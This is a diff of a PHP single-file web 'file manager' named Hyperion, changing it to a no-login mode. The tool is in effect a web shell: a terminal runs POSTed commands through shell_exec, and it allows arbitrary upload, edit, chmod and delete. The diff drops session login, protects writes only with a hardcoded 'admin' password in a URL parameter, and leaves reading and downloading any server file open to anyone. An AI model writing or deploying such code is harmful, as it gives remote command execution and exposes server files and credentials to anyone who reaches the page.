@@ -1,29 +1,40 @@
 <?php
 /*
-    Hyperion File Manager v9 [Titan Edition]
-    - Fixed: Navigation Logic (Graceful Fail on Access Denied)
-    - Redesigned: Create Modal (Modern Cards)
-    - Optimized: Terminal for Mobile
+    Hyperion File Manager v10 [No-Auth Mode]
+    - Login Screen Removed
+    - Write Operations Protected via URL Parameter (?p=password)
+    - Read-Only Mode by default
 */
-session_start();
 error_reporting(0);
 @ini_set('memory_limit', '128M');
 @set_time_limit(0);
 
 $CONFIG = [
+    'pass' => 'admin', 
     'home' => str_replace('\\', '/', getcwd())
 ];
 
-}
+$p_param = $_REQUEST['p'] ?? '';
+$IS_ADMIN = ($p_param === $CONFIG['pass']);
 
 // --- API ACTIONS ---
 if(isset($_REQUEST['req']) || isset($_FILES['f'])) {
     
     $cwd = $_REQUEST['cwd'] ?? $CONFIG['home'];
-    $cwd = str_replace('//', '/', $cwd); // Normalize
+    $cwd = str_replace('//', '/', $cwd); 
 
-    // 1. CMD
+    // Helper to block write actions
+    function check_auth() {
+        global $IS_ADMIN;
+        if(!$IS_ADMIN) {
+            echo json_encode(['status'=>false, 'msg'=>'Access Denied (Read Only)']);
+            exit;
+        }
+    }
+
+    // 1. CMD (Protected)
     if($_REQUEST['req'] === 'cmd') {
+        check_auth();
         $cmd = $_POST['cmd'];
         $out = "Shell disabled";
         if(function_exists('shell_exec')) {
@@ -36,8 +47,9 @@ if(isset($_REQUEST['req']) || isset($_FILES['f'])) {
         exit;
     }
 
-    // 2. UPLOAD
+    // 2. UPLOAD (Protected)
     if(isset($_FILES['f'])) {
+        check_auth();
         $c = 0;
         foreach($_FILES['f']['name'] as $i => $n) {
             if(move_uploaded_file($_FILES['f']['tmp_name'][$i], $cwd.'/'.$n)) $c++;
@@ -45,7 +57,7 @@ if(isset($_REQUEST['req']) || isset($_FILES['f'])) {
         echo json_encode(['status'=>true, 'msg'=>"$c Files Uploaded"]); exit;
     }
 
-    // 3. DOWNLOAD
+    // 3. DOWNLOAD (Public)
     if($_REQUEST['req'] === 'download') {
         $f = $_REQUEST['target'];
         if(file_exists($f)) {
@@ -64,15 +76,15 @@ if(isset($_REQUEST['req']) || isset($_FILES['f'])) {
         $r = $_REQUEST['req'];
         
         if($r === 'list') {
+            // Public Read
             $scanDir = $cwd;
             if(empty($scanDir)) $scanDir = '/';
             
-            // GRACEFUL HANDLING: If not readable, don't crash. Return empty list + '..'
             $files = @scandir($scanDir);
             $readable = is_readable($scanDir);
             
             if($files === false) {
-                $files = ['..']; // Minimal fallback
+                $files = ['..'];
                 $readable = false;
             }
             
@@ -110,7 +122,7 @@ if(isset($_REQUEST['req']) || isset($_FILES['f'])) {
                     'size' => $size,
                     'date' => $date,
                     'perms' => $perms,
-                    'w' => @is_writable($p) // Writable flag
+                    'w' => @is_writable($p)
                 ];
             }
             
@@ -124,13 +136,18 @@ if(isset($_REQUEST['req']) || isset($_FILES['f'])) {
             $res['data'] = $list;
             $res['cwd'] = $scanDir;
             $res['readable'] = $readable;
-            $res['writable'] = is_writable($scanDir);
+            $res['writable'] = is_writable($scanDir) && $IS_ADMIN; // UI Flag
         }
-        elseif($r === 'read') $res['content'] = file_get_contents($_POST['target']);
-        elseif($r === 'save') file_put_contents($_POST['target'], $_POST['content']);
-        elseif($r === 'rename') rename($_POST['old'], $cwd.'/'.$_POST['new']);
-        elseif($r === 'chmod') chmod($_POST['target'], octdec($_POST['mode']));
+        elseif($r === 'read') {
+            // Public Read
+            $res['content'] = file_get_contents($_POST['target']);
+        }
+        // Protected Actions
+        elseif($r === 'save') { check_auth(); file_put_contents($_POST['target'], $_POST['content']); }
+        elseif($r === 'rename') { check_auth(); rename($_POST['old'], $cwd.'/'.$_POST['new']); }
+        elseif($r === 'chmod') { check_auth(); chmod($_POST['target'], octdec($_POST['mode'])); }
         elseif($r === 'delete') {
+            check_auth();
             $t = $_POST['target'];
             if(is_dir($t)) {
                 $it = new RecursiveDirectoryIterator($t, RecursiveDirectoryIterator::SKIP_DOTS);
@@ -139,8 +156,8 @@ if(isset($_REQUEST['req']) || isset($_FILES['f'])) {
                 rmdir($t);
             } else unlink($t);
         }
-        elseif($r === 'new_folder') mkdir($cwd.'/'.$_POST['name']);
-        elseif($r === 'new_file') file_put_contents($cwd.'/'.$_POST['name'], "");
+        elseif($r === 'new_folder') { check_auth(); mkdir($cwd.'/'.$_POST['name']); }
+        elseif($r === 'new_file') { check_auth(); file_put_contents($cwd.'/'.$_POST['name'], ""); }
         
     } catch(Exception $e) { $res['status']=false; $res['msg']=$e->getMessage(); }
     
@@ -158,7 +175,7 @@ function size_fmt($b) {
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<title>Hyperion Titan</title>
+<title>Hyperion</title>
 <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/ace.js"></script>
 <style>
@@ -166,15 +183,17 @@ function size_fmt($b) {
     * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; user-select:none; }
     body { background: var(--bg); color: #e4e4e7; font-family: -apple-system, sans-serif; height: 100dvh; display: flex; flex-direction: column; overflow: hidden; }
 
-    /* UI COMPONENTS */
     header { height: 60px; display: flex; align-items: center; justify-content: space-between; padding: 0 16px; border-bottom: 1px solid var(--border); background: rgba(9,9,11,0.8); backdrop-filter: blur(10px); z-index: 50; }
     .logo { font-weight: 700; font-size: 18px; color: #fff; display: flex; align-items: center; gap: 8px; }
+    .status-badge { padding: 4px 8px; border-radius: 6px; font-size: 10px; font-weight: bold; text-transform: uppercase; letter-spacing: 0.5px; }
+    .admin { background: rgba(99,102,241,0.2); color: var(--pri); border: 1px solid rgba(99,102,241,0.3); }
+    .readonly { background: #27272a; color: #71717a; border: 1px solid #3f3f46; }
+
     .path-bar { padding: 10px 16px; border-bottom: 1px solid var(--border); overflow-x: auto; white-space: nowrap; display: flex; gap: 6px; scrollbar-width: none; background: var(--bg); }
     .crumb { background: #27272a; padding: 6px 12px; border-radius: 8px; font-size: 12px; color: #a1a1aa; cursor: pointer; transition: 0.2s; }
     .crumb:hover { background: #3f3f46; color: #fff; }
     .crumb.active { background: rgba(99,102,241,0.2); color: var(--pri); border: 1px solid rgba(99,102,241,0.3); }
 
-    /* LIST */
     #main { flex: 1; overflow-y: auto; padding: 16px; padding-bottom: 110px; }
     .item { display: flex; align-items: center; padding: 12px; margin-bottom: 8px; background: var(--card); border-radius: 12px; border: 1px solid transparent; transition: 0.1s; position: relative; }
     .item:active { transform: scale(0.98); background: #27272a; }
@@ -188,14 +207,12 @@ function size_fmt($b) {
     .name { font-size: 14px; font-weight: 500; margin-bottom: 2px; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
     .det { font-size: 11px; color: #71717a; }
     
-    /* MODALS */
     .ovl { position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 200; display: none; align-items: center; justify-content: center; backdrop-filter: blur(5px); opacity: 0; transition: 0.2s; }
     .ovl.show { display: flex; opacity: 1; }
     
     .modal { background: #18181b; width: 85%; max-width: 320px; border-radius: 20px; border: 1px solid var(--border); padding: 24px; transform: scale(0.9); transition: 0.2s cubic-bezier(0.16, 1, 0.3, 1); box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
     .ovl.show .modal { transform: scale(1); }
     
-    /* CREATE NEW GRID UI */
     .m-inp { width: 100%; background: #27272a; border: 1px solid #3f3f46; padding: 14px; border-radius: 12px; color: #fff; font-size: 16px; outline: none; text-align: center; margin-bottom: 20px; }
     .m-inp:focus { border-color: var(--pri); }
     .c-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
@@ -206,14 +223,12 @@ function size_fmt($b) {
     .c-card.f:hover { border-color: #3b82f6; } .c-card.f i { color: #3b82f6; }
     .c-card.d:hover { border-color: #f59e0b; } .c-card.d i { color: #f59e0b; }
 
-    /* DOCK */
     .dock { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%); background: rgba(24,24,27,0.9); backdrop-filter: blur(20px); border: 1px solid var(--border); border-radius: 24px; display: flex; padding: 12px 24px; gap: 28px; z-index: 100; box-shadow: 0 20px 50px rgba(0,0,0,0.6); }
     .d-btn { font-size: 24px; color: #71717a; cursor: pointer; transition: 0.2s; display: flex; flex-direction: column; align-items: center; gap: 4px; }
     .d-btn:hover { color: #fff; }
     .d-btn.act { color: var(--pri); transform: translateY(-4px); }
     .d-btn.dang { color: var(--err); }
 
-    /* TERMINAL MOBILE OPTIMIZED */
     #term { position: fixed; inset: 0; background: #09090b; z-index: 300; display: none; flex-direction: column; font-family: 'Courier New', monospace; }
     #term-head { padding: 12px 16px; background: #18181b; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; color: #a1a1aa; font-size: 12px; letter-spacing: 1px; font-weight: 700; }
     #term-out { flex: 1; padding: 16px; overflow-y: auto; color: #22c55e; font-size: 15px; white-space: pre-wrap; line-height: 1.5; -webkit-overflow-scrolling: touch; }
@@ -221,7 +236,6 @@ function size_fmt($b) {
     #term-in { flex: 1; background: #27272a; border: 1px solid #3f3f46; color: #fff; font-size: 16px; outline: none; margin-left: 10px; padding: 8px 12px; border-radius: 8px; font-family: monospace; }
     #term-in:focus { border-color: #22c55e; }
     
-    /* EDITOR */
     #ed { position: fixed; inset: 0; background: #09090b; z-index: 250; display: none; flex-direction: column; }
     .toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #27272a; color: #fff; padding: 10px 20px; border-radius: 30px; border: 1px solid #3f3f46; font-size: 13px; display: flex; align-items: center; gap: 8px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); z-index: 999; animation: pop 0.3s cubic-bezier(0.16, 1, 0.3, 1); }
     @keyframes pop { from { transform: translate(-50%, -20px) scale(0.9); opacity: 0; } }
@@ -233,11 +247,15 @@ function size_fmt($b) {
 
 <!-- HEADER -->
 <header>
-    <div class="logo"><i class="ri-radar-fill" style="color:var(--pri)"></i> HYPERION</div>
+    <div class="logo">
+        <i class="ri-radar-fill" style="color:var(--pri)"></i> HYPERION
+        <span class="status-badge <?= $IS_ADMIN ? 'admin' : 'readonly' ?>" style="margin-left:10px">
+            <?= $IS_ADMIN ? 'ADMIN' : 'READ ONLY' ?>
+        </span>
+    </div>
     <div style="display:flex; gap: 16px; font-size: 20px; color:#a1a1aa;">
         <i class="ri-terminal-box-fill" onclick="termOpen()" style="cursor:pointer"></i>
         <i class="ri-home-4-fill" onclick="nav(S.home)" style="cursor:pointer"></i>
-        <i class="ri-logout-box-r-line" onclick="location.href='?logout'" style="cursor:pointer;color:var(--err)"></i>
     </div>
 </header>
 
@@ -299,6 +317,11 @@ window.onload = () => { load(); }
 async function api(req, data={}) {
     let fd = new FormData();
     fd.append('req', req); fd.append('cwd', S.cwd);
+    
+    // AUTO-INJECT P PARAMETER
+    let p = new URLSearchParams(window.location.search).get('p');
+    if(p) fd.append('p', p);
+
     for(let k in data) fd.append(k, data[k]);
     try { return await (await fetch('?', {method:'POST', body:fd})).json(); } catch(e){ return {status:false, msg:'Net Err'}; }
 }
@@ -397,7 +420,6 @@ function modalNew() {
     openModal('Create New', '', h);
 }
 function menu(n) {
-    // Uses generic create modal structure for menu options to keep code small
     let h = `
     <div class="c-grid" style="grid-template-columns:1fr 1fr;gap:10px">
         <div class="c-card" onclick="prepRen('${n}')"><i class="ri-pencil-fill"></i><span>Rename</span></div>
@@ -472,6 +494,11 @@ async function doUp() {
     if(!f.length) return;
     toast('Uploading...');
     let fd = new FormData(); fd.append('cwd', S.cwd);
+    
+    // AUTO-INJECT P PARAMETER
+    let p = new URLSearchParams(window.location.search).get('p');
+    if(p) fd.append('p', p);
+
     for(let i=0; i<f.length; i++) fd.append('f[]', f[i]);
     await fetch('?', {method:'POST', body:fd});
     load(); toast('Upload Done');
